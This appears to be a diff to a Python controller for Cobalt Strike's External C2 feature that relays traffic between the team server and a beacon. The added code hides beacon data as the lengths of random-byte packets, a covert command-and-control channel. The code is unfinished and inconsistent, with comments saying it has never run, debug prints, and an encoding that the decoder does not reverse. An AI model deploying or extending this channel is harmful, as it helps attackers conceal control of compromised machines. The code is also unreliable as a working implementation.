@@ -6,13 +6,12 @@
     Program to provide TCP communications for Cobalt Strike using the External C2 feature.
 """
 import argparse
-import base64
 import ipaddress
 import socket
 import struct
 import sys
 import time
-
+import os
 
 class TCPinfo:
     """
@@ -38,6 +37,7 @@ class ExternalC2Controller:
     def __init__(self, port):
         self.port = port
 
+    # Weird c2 thing
     def encode_frame(self, data):
         """
         
@@ -46,52 +46,7 @@ class ExternalC2Controller:
         """
         return struct.pack("<I", len(data)) + data
 
-    def decode_frame(self, data):
-        """
-        
-        :param data: frame to decode
-        :return: length of data and data from frame
-        """
-        len = struct.unpack("<I", data[0:3])
-        body = data[4:]
-        return len, body
-    
-    def base64(self, msg):
-        """
-
-        :param msg: String to encode in Base64
-        :return: Base64 encoded string (in bytes)
-        """
-        b64msg = base64.b64encode(msg)
-        return b64msg
-
-    def debase64(self, b64msg):
-        """
-
-        :param b64msg: Base64 string to be decoded
-        :return: Decoded string
-        """
-        msg = base64.b64decode(b64msg)
-        return msg
-    
-    def equalcheck(self, b64msg):
-        """
-
-        :param b64msg: Base64 string
-        :return: Base64 string with == at end of it
-        """
-        # TODO: Find a better way of checking for end of B64 message
-        equalbytes = "=".encode()
-        equalequalbytes = "==".encode()
-        if b64msg.find(equalequalbytes) != -1:
-            return b64msg
-        elif b64msg.find(equalbytes) != -1:
-            b64msg += equalbytes
-            return b64msg
-        else:
-            b64msg += equalequalbytes
-            return b64msg
-
+    #DONT CHANGE
     def send_to_ts(self, data):
         """
         
@@ -99,6 +54,7 @@ class ExternalC2Controller:
         """
         self._socketTS.sendall(self.encode_frame(data))
 
+    #DONT CHANGE
     def recv_from_ts(self):
         """
         
@@ -111,14 +67,34 @@ class ExternalC2Controller:
             data += self._socketTS.recv(l - len(data))
         return data
 
+    #TODO: This has never run! 
     def sendToBeacon(self, tcpinfo, data):
         """
         
         :param tcpinfo: Class with user tcp info
         :param data: Data to send to beacon
         """
-        frame = self.encode_frame(data)
-        self._socketBeacon.sendall(frame)
+        
+        for blob in data:
+            #print(blob)
+            value = blob
+            #value = int.from_bytes(blob, "big")
+            if value <= 128:
+                value += 128
+            
+            #Generate random bytes of length of byte
+            toSend = os.urandom(value)
+
+            #print(value)
+
+            self._socketBeacon.sendall(toSend)
+
+        #If we have sent all of the data end with 100 bytes of length
+        print("YO YOYO!")
+        self._socketBeacon.sendall(os.urandom(100))
+
+        #TODO: do we need this?
+        #frame = self.encode_frame(data)
 
 
     def recvFromBeacon(self, tcpinfo):
@@ -127,13 +103,22 @@ class ExternalC2Controller:
         :param tcpinfo: Class with user TCP info
         :return: data received from beacon
         """
+        #TODO: is this the right data type?
+        data = []
+        print("HEREE!")
         try:
-            data_length = self._socketBeacon.recv(4)
+            while True:
+                blob = self._socketBeacon.recv(512)
+                
+                #If we have recieved an end code
+                if len(blob) == 100:
+                    return data
+                blobLen = len(blob) % 256 
+                data += blobLen.to_bytes(1, 'big')
         except:
             print("Recv failed.")
             return None
-        data = self._socketBeacon.recv(4096)
-        return data
+
 
 
     def run(self, tcpinfo):
